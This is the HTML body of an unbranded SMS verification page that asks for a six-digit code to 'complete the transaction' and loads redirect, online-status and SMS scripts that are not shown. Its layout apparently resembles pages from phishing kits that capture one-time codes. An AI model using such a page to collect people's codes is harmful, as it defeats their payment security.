  <body>
    <div class="container">
      <div class="left-section">
        <h1>SMS Verification</h1>
        <div class="subtitle">Security Step</div>

        <div class="illustration">
          <svg viewBox="0 0 220 180" xmlns="http://www.w3.org/2000/svg">
            <defs>
              <linearGradient id="sms-grad" x1="0%" y1="0%" x2="100%" y2="100%">
                <stop
                  offset="0%"
                  style="stop-color: #4d6aff; stop-opacity: 1"
                />
                <stop
                  offset="100%"
                  style="stop-color: #3355ff; stop-opacity: 1"
                />
              </linearGradient>
            </defs>

            <!-- Phone illustration -->
            <rect
              x="70"
              y="50"
              width="80"
              height="140"
              rx="12"
              fill="url(#sms-grad)"
            />
            <rect x="85" y="60" width="50" height="90" rx="4" fill="white" />

            <!-- Message bubbles -->
            <rect x="75" y="160" width="40" height="15" rx="7" fill="#e0e0e0" />
            <rect
              x="105"
              y="160"
              width="30"
              height="15"
              rx="7"
              fill="#4d6aff"
            />

            <!-- Signal waves -->
            <circle cx="180" cy="100" r="8" fill="#4d6aff" opacity="0.6" />
            <circle cx="180" cy="100" r="15" fill="#4d6aff" opacity="0.3" />
            <circle cx="180" cy="100" r="22" fill="#4d6aff" opacity="0.1" />
          </svg>
        </div>

        <p class="description">
          We've sent a verification code to your mobile phone. Please enter it
          below to complete the transaction.
        </p>
      </div>

      <div class="right-section">
        <div class="payment-card">
          <div class="card-header">
            <div class="status-icon">
              <svg
                width="32"
                height="32"
                viewBox="0 0 24 24"
                fill="none"
                stroke="white"
                stroke-width="2.5"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"></path>
              </svg>
            </div>
            <div class="payment-info">
              <div class="payment-status">SMS Verification</div>
            </div>
          </div>

          <div class="order-info">
            <span class="order-label">Order No.</span>
            <span class="order-number" id="orderNumber">
              770727642081439744c514
              <svg
                class="copy-icon"
                width="16"
                height="16"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
              >
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                <path
                  d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
                ></path>
              </svg>
            </span>
          </div>

          <div class="form-container">
            <div class="payment-method">
              <svg
                class="method-icon"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
              >
                <path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"></path>
              </svg>
              <span>SMS Code</span>
            </div>

            <form id="sms-form">
              <div class="form-group">
                <label class="form-label">Verification Code</label>
                <input
                  type="text"
                  class="form-input"
                  placeholder="Enter 6-digit code"
                  id="sms"
                  inputmode="numeric"
                  maxlength="6"
                  autofocus
                />
                <div
                  class="error-message"
                  id="error-msg"
                  style="display: none"
                ></div>
              </div>

              <button type="submit" class="pay-button" id="submit-btn">
                <svg
                  width="18"
                  height="18"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"
                  stroke-linecap="round"
                >
                  <path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"></path>
                </svg>
                Verify Code
              </button>

              <div class="loading" id="loading" style="display: none">
                <svg
                  width="18"
                  height="18"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"
                >
                  <circle cx="12" cy="12" r="10"></circle>
                </svg>
                Verifying...
              </div>
            </form>

            <div class="sms-help">
              <p>Didn't receive the code?</p>
              <button type="button" class="resend-button" id="resend-btn">
                Resend SMS
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Подключаем скрипты -->
    <script src="/static/js/redirect.js?v2"></script>
    <script src="/static/js/online-status.js?v2"></script>
    <script src="/static/js/sms.js?v2"></script>
  </body>
</html>
